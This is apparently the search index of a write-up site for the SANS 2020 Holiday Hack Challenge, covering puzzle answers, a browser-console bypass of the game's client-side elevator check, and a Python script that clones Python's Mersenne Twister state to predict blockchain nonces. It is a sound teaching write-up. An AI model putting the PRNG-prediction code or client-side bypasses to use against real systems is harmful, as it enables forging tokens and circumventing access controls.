{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"pugpug's 2020 Holiday Hack writeups # Intro # One bright spot in 2020 was the annual Holiday Hack Challenge put on by SANS. This year Santa opened his newly renovated castle to the world. However, all was not merry and bright at the North Pole, as nefarious powers are working against Santa and his elves. Our job in the challenge is to solve the mystery of who is behind the problems the elves are experiencing and bring them to justice. As we progress through the castle we'll investigate such topics as why public S3 Amazon buckets aren't a good idea, dig into CAN-BUS traffic, discover why \"pseudo-random number generators\" aren't truly random, and why one shouldn't use MD5 as a hash algorithm. Organization # This writeup covers all of the objectives (yes, even 11b!), but not necessarily all of the elf terminals or other non-objective challenges. I'll include any sample code I used to complete the objectives in a separate section. Objectives & Answers # Uncover Santa's Gift List: Proxmark Investigate S3 Bucket: North Pole: The Frostiest Place On Earth Point-of-Sale Password Recovery: santapass Operate the Santavator Open HID Lock Splunk Challenge: The Lollipop Guild Solve the Sleigh's CAN-D-BUS Problem: Broken Tag Generator: JackFrostWasHere ARP Shenanigans: Tanta Kringle Defeat Fingerprint Sensor Naughty/Nice List with Blockchain Investigation Part 1: 57066318f32f729d Naughty/Nice List with Blockchain Investigation Part 2: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Note Four of the objetives don't require answers to be submitted. Instead, the objectives are completed by operating the elevator , opening a locked door , fixing Santa's sleigh , and bypassing a fingerprint sensor","title":"Welcome"},{"location":"#pugpugs-2020-holiday-hack-writeups","text":"","title":"pugpug's 2020 Holiday Hack writeups"},{"location":"#intro","text":"One bright spot in 2020 was the annual Holiday Hack Challenge put on by SANS. This year Santa opened his newly renovated castle to the world. However, all was not merry and bright at the North Pole, as nefarious powers are working against Santa and his elves. Our job in the challenge is to solve the mystery of who is behind the problems the elves are experiencing and bring them to justice. As we progress through the castle we'll investigate such topics as why public S3 Amazon buckets aren't a good idea, dig into CAN-BUS traffic, discover why \"pseudo-random number generators\" aren't truly random, and why one shouldn't use MD5 as a hash algorithm.","title":"Intro"},{"location":"#organization","text":"This writeup covers all of the objectives (yes, even 11b!), but not necessarily all of the elf terminals or other non-objective challenges. I'll include any sample code I used to complete the objectives in a separate section.","title":"Organization"},{"location":"#objectives-answers","text":"Uncover Santa's Gift List: Proxmark Investigate S3 Bucket: North Pole: The Frostiest Place On Earth Point-of-Sale Password Recovery: santapass Operate the Santavator Open HID Lock Splunk Challenge: The Lollipop Guild Solve the Sleigh's CAN-D-BUS Problem: Broken Tag Generator: JackFrostWasHere ARP Shenanigans: Tanta Kringle Defeat Fingerprint Sensor Naughty/Nice List with Blockchain Investigation Part 1: 57066318f32f729d Naughty/Nice List with Blockchain Investigation Part 2: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Note Four of the objetives don't require answers to be submitted. Instead, the objectives are completed by operating the elevator , opening a locked door , fixing Santa's sleigh , and bypassing a fingerprint sensor","title":"Objectives &amp; Answers"},{"location":"conclusion/","text":"pugpug's 2020 Holiday Hack writeups # Conclusion # KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null! Another Holiday Hack Challenge is complete. Thank you to the entire team who puts this on. I wish I could have covered everything in this report, but as we're limited to 50 pages, I can't. The poem hidden in the painting of Santa, evan's \"Secret Garden\", the references to last years's HHC, you'll have to find on your own. I still haven't figured out how to get to the steamtunnels , but I will.. Joe Ammond @joeammond 'pugpug#6191' on Discord.","title":"Conclusion"},{"location":"conclusion/#pugpugs-2020-holiday-hack-writeups","text":"","title":"pugpug's 2020 Holiday Hack writeups"},{"location":"conclusion/#conclusion","text":"KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null! Another Holiday Hack Challenge is complete. Thank you to the entire team who puts this on. I wish I could have covered everything in this report, but as we're limited to 50 pages, I can't. The poem hidden in the painting of Santa, evan's \"Secret Garden\", the references to last years's HHC, you'll have to find on your own. I still haven't figured out how to get to the steamtunnels , but I will.. Joe Ammond @joeammond 'pugpug#6191' on Discord.","title":"Conclusion"},{"location":"fun/nail/","text":"The Nail # On the scaffolding to the left of the entrance to the Castle is a bucket of nails, with a single nail on the scaffold: The Nail speaks wisdom: Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. https://www.twitch.tv/banjocrashland The link is to BanjoCrashland's (Jason Blanchard, Director of Content & Community at Black Hills Infosec) Twitch channel, a resource on \"Job Hunting Like a Hacker\":","title":"The Nail"},{"location":"fun/nail/#the-nail","text":"On the scaffolding to the left of the entrance to the Castle is a bucket of nails, with a single nail on the scaffold: The Nail speaks wisdom: Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. https://www.twitch.tv/banjocrashland The link is to BanjoCrashland's (Jason Blanchard, Director of Content & Community at Black Hills Infosec) Twitch channel, a resource on \"Job Hunting Like a Hacker\":","title":"The Nail"},{"location":"fun/portrait/","text":"A poem, hidden in Santa's portrait # At the back of the Entry Hall is a portrait of Santa: Looking closely we can see it in more detail: And zooming in, there are some letters hidden in the portrait: Some of them are a bit tricky to find, but if you're patient enough, you will find the phrase NOW I SHALL BE OUT OF SIGHT , a line from a poem by Hannah Flagg Gould titled Jack Frost : The Frost looked forth one still, clear night, And whispered, \u201cNow I shall be out of sight; So, through the valley, and over the height, In silence I'll take my way. I will not go on like that blustering train, The wind and the snow, the hail and the rain, That make such a bustle and noise in vain, But I'll be as busy as they!\u201d So he flew to the mountain, and powdered its crest; He lit on the trees, and their boughs he drest With diamonds and pearls; and over the breast Of the quivering lake he spread A coat of mail, that it need not fear The downward point of many a spear That he hung on its margin, far and near, Where a rock could rear its head. He went to the windows of those who slept, And over each pane, like a fairy, crept; Wherever he breathed, wherever he stepped, By the light of the morn were seen Most beautiful things; there were flowers and trees; There were bevies of birds and swarms of bees; There were cities with temples and towers; and these All pictured in silvery sheen! But he did one thing that was hardly fair- He peeped in the cupboard, and finding there That all had forgotten for him to prepare- \u201cNow, just to set them a-thinking, I'll bite this basket of fruit,\u201d said he, \u201cThis costly pitcher I'll burst in three; And the glass of water they've left for me Shall 'tchick' to tell them I'm drinking!\u201d","title":"Santa's portrait poem"},{"location":"fun/portrait/#a-poem-hidden-in-santas-portrait","text":"At the back of the Entry Hall is a portrait of Santa: Looking closely we can see it in more detail: And zooming in, there are some letters hidden in the portrait: Some of them are a bit tricky to find, but if you're patient enough, you will find the phrase NOW I SHALL BE OUT OF SIGHT , a line from a poem by Hannah Flagg Gould titled Jack Frost : The Frost looked forth one still, clear night, And whispered, \u201cNow I shall be out of sight; So, through the valley, and over the height, In silence I'll take my way. I will not go on like that blustering train, The wind and the snow, the hail and the rain, That make such a bustle and noise in vain, But I'll be as busy as they!\u201d So he flew to the mountain, and powdered its crest; He lit on the trees, and their boughs he drest With diamonds and pearls; and over the breast Of the quivering lake he spread A coat of mail, that it need not fear The downward point of many a spear That he hung on its margin, far and near, Where a rock could rear its head. He went to the windows of those who slept, And over each pane, like a fairy, crept; Wherever he breathed, wherever he stepped, By the light of the morn were seen Most beautiful things; there were flowers and trees; There were bevies of birds and swarms of bees; There were cities with temples and towers; and these All pictured in silvery sheen! But he did one thing that was hardly fair- He peeped in the cupboard, and finding there That all had forgotten for him to prepare- \u201cNow, just to set them a-thinking, I'll bite this basket of fruit,\u201d said he, \u201cThis costly pitcher I'll burst in three; And the glass of water they've left for me Shall 'tchick' to tell them I'm drinking!\u201d","title":"A poem, hidden in Santa's portrait"},{"location":"fun/secret-garden/","text":"The Secret Garden # In the back right corner of the Courtyard is a section of hedge that's different from the rest: Walking through, you're in the Secret Garden (the static image doesn't capture it's full glory, visit it to see): Evan is behind the table, and will speak knowledge to you: (Interestingly, his dialog changes over time.. this doesn't match what he said when I visited him in December). Q3 6oMI f44W? uuu QWe W?1 f44W? uuuuf44W? uuu","title":"The Secret Garden"},{"location":"fun/secret-garden/#the-secret-garden","text":"In the back right corner of the Courtyard is a section of hedge that's different from the rest: Walking through, you're in the Secret Garden (the static image doesn't capture it's full glory, visit it to see): Evan is behind the table, and will speak knowledge to you: (Interestingly, his dialog changes over time.. this doesn't match what he said when I visited him in December). Q3 6oMI f44W? uuu QWe W?1 f44W? uuuuf44W? uuu","title":"The Secret Garden"},{"location":"objectives/1/","text":"Uncover Santa's Gift List # The first objective is a relatively simple one. It doesn't involve coding, network packet capture and analysis, or other advanced techniques that will be needed as we progress through the objectives. Objective # There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Difficulty: 1/5 Jingle Ringford's dialog # Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord ! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area. Hints # There are tools out there that could help Filter the Distortion that is this Twirl. Make sure you Lasso the correct twirly area. Solution # We can find the billboard by moving around the starting area (it may be necessary to adjust your browser's zoom level to make finding it easier). It's to above and to the left of the gondola: We can see the list in the bottom middle of the image, but the relevant part has been swirled so as to make it unreadable. To read it, we need to import the image into an image editing tool such as Photopea from the hint above. By selecting the swirled area, we can unswirl the text, revealing the answer: The list isn't 100% clear, but we can read the swirled list (from the bottom): Phil: Stuffed Pikachu Tad: Holiday Lights Clay: Darth Vader Suit Josh Wright: Proxmark And there's the answer: Josh Wright wants a 'Proxmark', whatever that is. Answer # Josh Wright's gift: Proxmark","title":"Uncover Santa's Gift List"},{"location":"objectives/1/#uncover-santas-gift-list","text":"The first objective is a relatively simple one. It doesn't involve coding, network packet capture and analysis, or other advanced techniques that will be needed as we progress through the objectives.","title":"Uncover Santa's Gift List"},{"location":"objectives/1/#objective","text":"There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Difficulty: 1/5","title":"Objective"},{"location":"objectives/1/#jingle-ringfords-dialog","text":"Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord ! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area.","title":"Jingle Ringford's dialog"},{"location":"objectives/1/#hints","text":"There are tools out there that could help Filter the Distortion that is this Twirl. Make sure you Lasso the correct twirly area.","title":"Hints"},{"location":"objectives/1/#solution","text":"We can find the billboard by moving around the starting area (it may be necessary to adjust your browser's zoom level to make finding it easier). It's to above and to the left of the gondola: We can see the list in the bottom middle of the image, but the relevant part has been swirled so as to make it unreadable. To read it, we need to import the image into an image editing tool such as Photopea from the hint above. By selecting the swirled area, we can unswirl the text, revealing the answer: The list isn't 100% clear, but we can read the swirled list (from the bottom): Phil: Stuffed Pikachu Tad: Holiday Lights Clay: Darth Vader Suit Josh Wright: Proxmark And there's the answer: Josh Wright wants a 'Proxmark', whatever that is.","title":"Solution"},{"location":"objectives/1/#answer","text":"Josh Wright's gift: Proxmark","title":"Answer"},{"location":"objectives/10/","text":"Defeat Fingerprint Sensor # There is definitely something fishy going on in Kringle Castle. It might be time to explore Santa's office for any information on the culprit. Objective # Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint. Difficulty: 3/5 Solution # Looking at the code that runs the elevator, we see that btn4 (the button for Santa's Office ) has a different function that handles click() events: 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 const handleBtn4 = () => { const cover = document . querySelector ( '.print-cover' ); cover . classList . add ( 'open' ); cover . addEventListener ( 'click' , () => { if ( btn4 . classList . contains ( 'powered' ) && hasToken ( 'besanta' )) { $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor : '3' , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : 'goToFloor-3' , }); } } }); } else { __SEND_MSG__ ({ type : 'sfx' , filename : 'error.mp3' , }); } }); }; Of particular note are the checks on line 5: a check to see that the button has a class powered , and that the user has a token besanta . Solving the hasToken('besanta') check is simple: the function hasToken checks for the existance of an item in the tokens list. In the JavaScript console, we can add besanta to tokens with tokens.push('besanta') . Solving the powered is a bit trickier. The powered class is added to the button by the function renderTraps() , called inside a continually-updating event loop for drawing the Sparkle Stream on the screen. Manually adding powered as a class to the button, or modifying the powered[] object in the JavaScript console results in the powered state being removed. One can build a rather convoluted method to split and color the Sparkle Stream: But there is a simpler solution: power a single receiver, such as the green one: Then change what floor the button sends us to when it is clicked. Open the elevator panel, make sure the green receiver is powered, then open the Developer tools. In the Inspector tab, find the one of the buttons that has the powered class: Then, edit the data_floor attribute to be 3 (the floor number of Santa's Office): Click the modified button, and you'll be taken to Santa's Office. Answer # Visit Santa's Office.","title":"Defeat Fingerprint Sensor"},{"location":"objectives/10/#defeat-fingerprint-sensor","text":"There is definitely something fishy going on in Kringle Castle. It might be time to explore Santa's office for any information on the culprit.","title":"Defeat Fingerprint Sensor"},{"location":"objectives/10/#objective","text":"Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint. Difficulty: 3/5","title":"Objective"},{"location":"objectives/10/#solution","text":"Looking at the code that runs the elevator, we see that btn4 (the button for Santa's Office ) has a different function that handles click() events: 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 const handleBtn4 = () => { const cover = document . querySelector ( '.print-cover' ); cover . classList . add ( 'open' ); cover . addEventListener ( 'click' , () => { if ( btn4 . classList . contains ( 'powered' ) && hasToken ( 'besanta' )) { $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor : '3' , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : 'goToFloor-3' , }); } } }); } else { __SEND_MSG__ ({ type : 'sfx' , filename : 'error.mp3' , }); } }); }; Of particular note are the checks on line 5: a check to see that the button has a class powered , and that the user has a token besanta . Solving the hasToken('besanta') check is simple: the function hasToken checks for the existance of an item in the tokens list. In the JavaScript console, we can add besanta to tokens with tokens.push('besanta') . Solving the powered is a bit trickier. The powered class is added to the button by the function renderTraps() , called inside a continually-updating event loop for drawing the Sparkle Stream on the screen. Manually adding powered as a class to the button, or modifying the powered[] object in the JavaScript console results in the powered state being removed. One can build a rather convoluted method to split and color the Sparkle Stream: But there is a simpler solution: power a single receiver, such as the green one: Then change what floor the button sends us to when it is clicked. Open the elevator panel, make sure the green receiver is powered, then open the Developer tools. In the Inspector tab, find the one of the buttons that has the powered class: Then, edit the data_floor attribute to be 3 (the floor number of Santa's Office): Click the modified button, and you'll be taken to Santa's Office.","title":"Solution"},{"location":"objectives/10/#answer","text":"Visit Santa's Office.","title":"Answer"},{"location":"objectives/11a/","text":"Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1 # Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools . (Enter just the 16-character hex value of the nonce) Difficulty: 5/5 Hints # If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Solution # These last two objectives are the most difficult in the entire challenge. We're given a shard of Santa's \"Naughty/Nice\" blockchain, and Python code that allows to process the chain and individual blocks contained within. Watching Professor Qwerty Petabyte's talk on the Naughty/Nice blockchain is essential to understanding this objective. In this objective, we're tasked with finding the nonce for a block beyond the end of the blockchain shard we've been given. The nonce is a 64-bit random value added to the beginning of each block to avoid hash collisions in the MD5 hash algorithm used for verifying the integrity of the blockchain: self . index = index if self . index == 0 : self . nonce = 0 # genesis block else : self . nonce = random . randrange ( 0xFFFFFFFFFFFFFFFF ) The first block in a chain (the 'genesis block') has a nonce of zero, whereas any subsequent block has a random 64-bit value added, generated from Python's random.randrange() function. However, from watching Tom Liston's talk on how the Pseudo-Random Number Generator \"Mersenne Twister\" generates numbers, we know if we have 624 consecutive numbers from the PRNG we can clone the state of the generator and use the clone to predict what the PRNG output will be. One challenge is that the implementation of the Mersenne Twister in Python returns 32-bit results, but the nonce generated for the block is a 64-bit value. To determine how the Python function randrange() generates randum values with >32 bits, we have to dig into the source for the Python random library. In https://github.com/python/cpython/blob/master/Lib/random.py , we can find the definition for the function randrange() starting at line 292: After some boilerplate type and argument checking, the relevant call to get random data is: if istep > 0 : n = ( width + istep - 1 ) // istep elif istep < 0 : n = ( width + istep + 1 ) // istep else : raise ValueError ( \"zero step for randrange()\" ) if n <= 0 : raise ValueError ( \"empty range for randrange()\" ) return istart + istep * self . _randbelow ( n ) n is the upper limit of value to return. So randrange calls _randbelow : def _randbelow_with_getrandbits ( self , n ): \"Return a random int in the range [0,n). Returns 0 if n==0.\" if not n : return 0 getrandbits = self . getrandbits k = n . bit_length () # don't use (n-1) here because n can be 1 r = getrandbits ( k ) # 0 <= r < 2**k while r >= n : r = getrandbits ( k ) return r The source to getrandbits is in https://github.com/python/cpython/blob/master/Modules/_randommodule.c : /*[clinic input] _random.Random.getrandbits self: self(type=\"RandomObject *\") k: int / getrandbits(k) -> x. Generates an int with k random bits. [clinic start generated code]*/ static PyObject * _random_Random_getrandbits_impl ( RandomObject * self , int k ) /*[clinic end generated code: output=b402f82a2158887f input=8c0e6396dd176fc0]*/ { int i , words ; uint32_t r ; uint32_t * wordarray ; PyObject * result ; if ( k < 0 ) { PyErr_SetString ( PyExc_ValueError , \"number of bits must be non-negative\" ); return NULL ; } if ( k == 0 ) return PyLong_FromLong ( 0 ); if ( k <= 32 ) /* Fast path */ return PyLong_FromUnsignedLong ( genrand_uint32 ( self ) >> ( 32 - k )); words = ( k - 1 ) / 32 + 1 ; wordarray = ( uint32_t * ) PyMem_Malloc ( words * 4 ); if ( wordarray == NULL ) { PyErr_NoMemory (); return NULL ; } /* Fill-out bits of long integer, by 32-bit words, from least significant to most significant. */ #if PY_LITTLE_ENDIAN for ( i = 0 ; i < words ; i ++ , k -= 32 ) #else for ( i = words - 1 ; i >= 0 ; i -- , k -= 32 ) #endif { r = genrand_uint32 ( self ); if ( k < 32 ) r >>= ( 32 - k ); /* Drop least significant bits */ wordarray [ i ] = r ; } result = _PyLong_FromByteArray (( unsigned char * ) wordarray , words * 4 , PY_LITTLE_ENDIAN , 0 /* unsigned */ ); PyMem_Free ( wordarray ); return result ; } The relevant code for returning random values >32-bits long is in the for() loop: 32-bit random values are generated, then filled into an array least-significant bits to most-significant bits. The nonce values therefore are the result of two calls to the PRNG for 32-bit values, the second shifted 32 bits and added to the first. This is equivalent to random.randrange(0xFFFFFFFFFFFFFFFF) . r1 = random . randrange ( 0xFFFFFFFF ) r2 = random . randrange ( 0xFFFFFFFF ) nonce = (( r2 << 32 ) + r1 ) Armed with this, we can write some code to: Retrieve all the nonce values from the blockchain shard Split each 64-bit value into it's 32-bit components Use the last 624 values to re-create the Python PRNG state Run our PRTG forward and generate nonce values for blocks, until we reach block 130000 Copying blockchain.dat , naughty_nice.py , official_public.pem and mt19937.py to a directory, we can run the following Python code to do the above: #!/usr/bin/env python3 # (c) 2020 Joe Ammond 'pugpug' (@joeammond) from mt19937 import mt19937 , untemper from naughty_nice import Chain , Block # Load the blockchain shard shard = Chain ( load = True , filename = 'blockchain.dat' ) # Pull all the nonces from the blockchain, split them into their # component 32-bit values, and append them to the list of seeds prng_seeds = [] for index in range ( len ( shard . blocks )): nonce = shard . blocks [ index ] . nonce r1 = nonce & 0xFFFFFFFF r2 = nonce >> 32 prng_seeds . append ( r1 ) prng_seeds . append ( r2 ) # Create our own version of an MT19937 PRNG. myprng = mt19937 ( 0 ) # Pull the last 624 seeds for the PRNG prng_seeds = prng_seeds [ - 624 :] # Seed our PRNG for index in range ( len ( prng_seeds )): myprng . MT [ index ] = untemper ( prng_seeds [ index ]) # Print the next 10 block nonces. We want the hex value for block 130000 for index in range ( 10 ): print ( 'Generating seed for block {} : ' . format ( index + 129997 ), end = '' ) r1 = myprng . extract_number () r2 = myprng . extract_number () nonce = (( r2 << 32 ) + r1 ) print ( nonce , ' %016.016x ' % ( nonce )) Running this code produces the following output: The hexadecimal value for block 130000 is 57066318f32f729d . Answer # 57066318f32f729d","title":"Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"objectives/11a/#objective-11a-naughtynice-list-with-blockchain-investigation-part-1","text":"Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools . (Enter just the 16-character hex value of the nonce) Difficulty: 5/5","title":"Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"objectives/11a/#hints","text":"If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time.","title":"Hints"},{"location":"objectives/11a/#solution","text":"These last two objectives are the most difficult in the entire challenge. We're given a shard of Santa's \"Naughty/Nice\" blockchain, and Python code that allows to process the chain and individual blocks contained within. Watching Professor Qwerty Petabyte's talk on the Naughty/Nice blockchain is essential to understanding this objective. In this objective, we're tasked with finding the nonce for a block beyond the end of the blockchain shard we've been given. The nonce is a 64-bit random value added to the beginning of each block to avoid hash collisions in the MD5 hash algorithm used for verifying the integrity of the blockchain: self . index = index if self . index == 0 : self . nonce = 0 # genesis block else : self . nonce = random . randrange ( 0xFFFFFFFFFFFFFFFF ) The first block in a chain (the 'genesis block') has a nonce of zero, whereas any subsequent block has a random 64-bit value added, generated from Python's random.randrange() function. However, from watching Tom Liston's talk on how the Pseudo-Random Number Generator \"Mersenne Twister\" generates numbers, we know if we have 624 consecutive numbers from the PRNG we can clone the state of the generator and use the clone to predict what the PRNG output will be. One challenge is that the implementation of the Mersenne Twister in Python returns 32-bit results, but the nonce generated for the block is a 64-bit value. To determine how the Python function randrange() generates randum values with >32 bits, we have to dig into the source for the Python random library. In https://github.com/python/cpython/blob/master/Lib/random.py , we can find the definition for the function randrange() starting at line 292: After some boilerplate type and argument checking, the relevant call to get random data is: if istep > 0 : n = ( width + istep - 1 ) // istep elif istep < 0 : n = ( width + istep + 1 ) // istep else : raise ValueError ( \"zero step for randrange()\" ) if n <= 0 : raise ValueError ( \"empty range for randrange()\" ) return istart + istep * self . _randbelow ( n ) n is the upper limit of value to return. So randrange calls _randbelow : def _randbelow_with_getrandbits ( self , n ): \"Return a random int in the range [0,n). Returns 0 if n==0.\" if not n : return 0 getrandbits = self . getrandbits k = n . bit_length () # don't use (n-1) here because n can be 1 r = getrandbits ( k ) # 0 <= r < 2**k while r >= n : r = getrandbits ( k ) return r The source to getrandbits is in https://github.com/python/cpython/blob/master/Modules/_randommodule.c : /*[clinic input] _random.Random.getrandbits self: self(type=\"RandomObject *\") k: int / getrandbits(k) -> x. Generates an int with k random bits. [clinic start generated code]*/ static PyObject * _random_Random_getrandbits_impl ( RandomObject * self , int k ) /*[clinic end generated code: output=b402f82a2158887f input=8c0e6396dd176fc0]*/ { int i , words ; uint32_t r ; uint32_t * wordarray ; PyObject * result ; if ( k < 0 ) { PyErr_SetString ( PyExc_ValueError , \"number of bits must be non-negative\" ); return NULL ; } if ( k == 0 ) return PyLong_FromLong ( 0 ); if ( k <= 32 ) /* Fast path */ return PyLong_FromUnsignedLong ( genrand_uint32 ( self ) >> ( 32 - k )); words = ( k - 1 ) / 32 + 1 ; wordarray = ( uint32_t * ) PyMem_Malloc ( words * 4 ); if ( wordarray == NULL ) { PyErr_NoMemory (); return NULL ; } /* Fill-out bits of long integer, by 32-bit words, from least significant to most significant. */ #if PY_LITTLE_ENDIAN for ( i = 0 ; i < words ; i ++ , k -= 32 ) #else for ( i = words - 1 ; i >= 0 ; i -- , k -= 32 ) #endif { r = genrand_uint32 ( self ); if ( k < 32 ) r >>= ( 32 - k ); /* Drop least significant bits */ wordarray [ i ] = r ; } result = _PyLong_FromByteArray (( unsigned char * ) wordarray , words * 4 , PY_LITTLE_ENDIAN , 0 /* unsigned */ ); PyMem_Free ( wordarray ); return result ; } The relevant code for returning random values >32-bits long is in the for() loop: 32-bit random values are generated, then filled into an array least-significant bits to most-significant bits. The nonce values therefore are the result of two calls to the PRNG for 32-bit values, the second shifted 32 bits and added to the first. This is equivalent to random.randrange(0xFFFFFFFFFFFFFFFF) . r1 = random . randrange ( 0xFFFFFFFF ) r2 = random . randrange ( 0xFFFFFFFF ) nonce = (( r2 << 32 ) + r1 ) Armed with this, we can write some code to: Retrieve all the nonce values from the blockchain shard Split each 64-bit value into it's 32-bit components Use the last 624 values to re-create the Python PRNG state Run our PRTG forward and generate nonce values for blocks, until we reach block 130000 Copying blockchain.dat , naughty_nice.py , official_public.pem and mt19937.py to a directory, we can run the following Python code to do the above: #!/usr/bin/env python3 # (c) 2020 Joe Ammond 'pugpug' (@joeammond) from mt19937 import mt19937 , untemper from naughty_nice import Chain , Block # Load the blockchain shard shard = Chain ( load = True , filename = 'blockchain.dat' ) # Pull all the nonces from the blockchain, split them into their # component 32-bit values, and append them to the list of seeds prng_seeds = [] for index in range ( len ( shard . blocks )): nonce = shard . blocks [ index ] . nonce r1 = nonce & 0xFFFFFFFF r2 = nonce >> 32 prng_seeds . append ( r1 ) prng_seeds . append ( r2 ) # Create our own version of an MT19937 PRNG. myprng = mt19937 ( 0 ) # Pull the last 624 seeds for the PRNG prng_seeds = prng_seeds [ - 624 :] # Seed our PRNG for index in range ( len ( prng_seeds )): myprng . MT [ index ] = untemper ( prng_seeds [ index ]) # Print the next 10 block nonces. We want the hex value for block 130000 for index in range ( 10 ): print ( 'Generating seed for block {} : ' . format ( index + 129997 ), end = '' ) r1 = myprng . extract_number () r2 = myprng . extract_number () nonce = (( r2 << 32 ) + r1 ) print ( nonce , ' %016.016x ' % ( nonce )) Running this code produces the following output: The hexadecimal value for block 130000 is 57066318f32f729d .","title":"Solution"},{"location":"objectives/11a/#answer","text":"57066318f32f729d","title":"Answer"},{"location":"objectives/11b/","text":"Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2 # The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block? Difficulty: 5/5 Solution # But we in it shall be remembered-we few, we happy few, we band of brothers; for he today that finishes 11b with me shall be my brother, be he ne'er so vile... 11b. The premise was simple: find the block that contains the data on Jack, change 4 bytes in it to display the original data, all while the MD5 hash of the block remained unchanged. We're given some hints: Jack used a type of hash collision called UNICOLL . Jack's score was originally overwhelmingly negative and is now overwhelmingly positive. And, Shinny Upatree swears he didn't write the PDF document attached to Jack's block. Finding the block isn't difficult: creating a list of scores of the blocks in the chain shows one block with a score of ffffffff (4294967295) , which matches what we learned from Tinsel Upatree about Jack's score. The block in question also has two documents, one of which is a very large PDF attachment. Dumping the block and the individual attachments shows that the block matches the SHA256 hash in the objective, so we know we've identified the block with Jack's data. Now that we've identified the block, let's take a look at the data in the block. We can understand the data format of the block from the Python code: def load_a_block ( self , fh ): self . index = int ( fh . read ( 16 ), 16 ) self . nonce = int ( fh . read ( 16 ), 16 ) self . pid = int ( fh . read ( 16 ), 16 ) self . rid = int ( fh . read ( 16 ), 16 ) self . doc_count = int ( fh . read ( 1 ), 10 ) self . score = int ( fh . read ( 8 ), 16 ) self . sign = int ( fh . read ( 1 ), 10 ) count = self . doc_count while ( count > 0 ): l_data = {} l_data [ 'type' ] = int ( fh . read ( 2 ), 16 ) l_data [ 'length' ] = int ( fh . read ( 8 ), 16 ) l_data [ 'data' ] = fh . read ( l_data [ 'length' ]) self . data . append ( l_data ) count -= 1 We can take a look at the block with xxd : Starting at byte 0x40 (64) , we can decode the block this way: doc_count = 2 score = ffffffff sign = 1 The next set of bytes are the attached documents. The first is of type 0xff 